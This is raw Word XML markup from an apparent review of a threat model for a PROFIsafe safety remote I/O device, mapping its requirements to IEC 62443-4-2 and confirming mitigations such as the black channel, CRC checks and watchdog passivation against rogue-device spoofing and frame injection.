            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D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E311A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E847D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>Keep — the connecting device must be identified/authenticated.</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">(Note the boundary: </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 1.2 authenticates the connecting device</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> = RQ-001; </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 2.1 authorizes what it may do</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> = RQ-011.)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="24B6F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E92B6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del w:id="0" w:author="Unknown">
              <w:r w:rsidRPr="00AD42B6">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>DoS mapping / CR 7.1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F2BC2" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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E6A92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 xml:space="preserve">Not </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>mapped</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-010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B4C9D" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Generalized flooding-DoS resilience is RQ-010. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>No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DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> CR </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>belongs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to</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> RQ-001.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AAE3372" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-001 → EHSR 1.1.9 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 3.1 (+RE1) [integrity/authenticity of the connected device's data], CR 1.2 [I&amp;A of the connecting device]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Flood/DoS resilience → RQ-010; unauthenticated DCP → RQ-011.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="27F86878" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D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945"/>
        <w:gridCol w:w="6260"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="76C914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CC8514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1A4706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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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23ADA2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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="64947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D7E4A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>Asset A – Trusted Safety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29874" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="000629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F5D20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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>ultimate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protected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asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="48BAF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7C34C" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>Asset F – Domain Separation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C09A8" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="000629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B6412" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct — the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>black channel</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (COM = non-safety) is why a connecting device on the non-safety path cannot directly corrupt the safety function. </w:t>
            </w:r>
            <w:hyperlink r:id="rId10" w:history="1">
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="255F60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51C77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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Asset C – Transmitted Safety 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1D41A" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D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2BF3D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Correct — the asset a connecting/rogue device actually attacks (forged/injected </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> frames).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56F97018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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE — corrected to the connecting-device threats:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4E2914" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing (primary).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A rogue/additional device connects and impersonates the F-Host, or presents a forged </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Source_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the core "connection of another device that communicates" threat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638AAE5E" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering (primary).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> That connected device injects/modifies safety frames.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A503EA3" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Replay (Tampering sub-case, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe's</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> running consecutive number (folded into the CRC) is the mitigation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537FE208" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1" w:author="Unknown">
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Denial of Service</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed as a primary.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A connected device that </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>disrupts</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the black channel is handled by the watchdog → safe state (tested below as a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fail-safe outcome</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), but </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized flooding-DoS resilience is RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — cross-referenced, not a standalone RQ-001 threat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0F3F8B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>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2005B441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>Your mitigations are confirmed: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844"/>
        <w:gridCol w:w="3453"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="7C2DEA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E0E5BA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Mitigation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D9C850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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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E6AAAA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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Confirmed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="3C696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7C2B44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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> black channel (COM = QM non-safety; FSCP tunneled)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48E92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t>SysArch</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> §3.3.1/4.1; SRIO-12921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E39BA" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId11" w:history="1">
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="36214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95A52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Address Type 1: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> checked, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Source_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> present but unchecked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AC958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SRIO-7830; SRIO-7794 ("In Address Type 1, the F-Source address will </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> be checked"); SRIO-10806/10807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AE85F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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId12" w:history="1">
              <w:r w:rsidRPr="00AD42B6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AD42B6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AD42B6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06297D" w:rsidRPr="0006297D" w14:paraId="6BDE9B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8CE7E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>4-byte CRC, CRC-Seed24/32 per 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685A0" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>SRIO-2998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11A66" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId13" w:history="1">
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0006297D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="1A9FB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59B39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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> watchdog → passivation (outputs Low, qualifier bad); re-integration needs acknowledgment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0BFD6" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">SRIO-1857/1210; SRIO-853; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>channel</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>-/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>device</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">-granular </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>passivation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C3E52" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
